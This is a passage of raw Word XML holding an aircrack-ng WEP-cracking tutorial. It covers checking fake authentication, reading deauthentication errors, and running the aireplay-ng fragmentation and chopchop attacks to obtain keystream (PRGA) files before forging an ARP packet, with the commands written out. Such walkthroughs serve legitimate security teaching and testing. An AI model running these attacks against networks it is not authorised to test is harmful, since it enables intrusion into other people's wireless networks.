        </w:rPr>
        <w:t xml:space="preserve"> 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDA2614" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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q</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 - Send keep alive packets every 10 seconds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DFCB9E4" w14:textId="29D0AAB0" w:rsidR="002B0795" w:rsidRPr="00F37B2B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53741A3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Notice the “Got a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet” and the continuous retries above. Do not proceed to the next step until you have the fake authentication running correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281DDD1D" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CB8590F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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673D5EC7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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 access points are configured to only allow selected MAC addresses to associate and connect. If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list. See the MAC access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>control troubleshooting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tip </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:anchor="troubleshooting_tips" w:history="1">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="107902"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3869D953" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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at any time you wish to confirm you are properly associated is to use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and look at the packets. Start another session and…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC3279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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD35914" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="230CF9BB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008D1EBD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D54DE1" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002A541E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69198D7F"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Here is a typical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error message you are looking for:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14563C66"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11:04:34.360700 314us BSSID:00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> DA:00:09:5B:EC:EE:F2 SA:00:14:6c:7e:40:80   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Class 3 frame received from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nonassociated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> station</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B57C0D0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="008CC86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Notice that the access point (00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) is telling the source (00:09:5B:EC:EE:F2) you are not associated. Meaning, the AP will not process or accept the injected packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F0CCEB"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want to select only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packets with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then you can use: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F22160" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EF72239" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="003112DC" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>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 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>grep</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DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="49E8CBA9" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02D9DBE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may need to tweak the phrase “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” to pick out the exact packets you want.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD5E7A9" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B2527D1"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**USE THE BELOW ATTACKS IF FAKE AUTH FAILS**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B758392"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3 -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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fragmenation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack to obtain PRGA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4645619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run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBE9B40" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0070331F" w:rsidRDefault="002B0795" w:rsidP="002B0795">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FRAG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2156D093" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008D1EBD"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-5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8C67A7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00EA0EF7" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="177139C0"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6DC14A8C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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-5 means the fragmentation attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B55C7DC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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14E10516" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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178CDF62" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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4353DBDF" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0326DC8C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002463D1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Success! The file “fragment-0203-180343.xor” can then be used in the next step</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E794DF" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4346D05B"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the fragmentation attack was not successful, you can then try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technique next. Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB41D60" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ED7ACC4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0070331F" w:rsidRDefault="002B0795" w:rsidP="002B0795">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CHOPCHOP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230B9A38" w14:textId="77777777" w:rsidR="002B0795"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F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2826F8" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00F37B2B" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="126BBCA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4A313439" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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-4 means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attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAD5B94" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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019F13B0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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4EC2EF06" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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4C4077E5" w14:textId="3D1346F8" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27965DB4" w14:textId="77777777" w:rsidR="00307E5D" w:rsidRDefault="00307E5D" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="604462BB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00204ED2" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Success! The file “replay_dec-0201-191706.xor” above can then be used in the next step to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8C9845" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EBA5DF7"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packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to create an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0EB3B0D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the previous step, we obtained PRGA. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>It does not matter which attack generated the PRGA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>both are equal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. This PRGA is stored in the files ending with “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
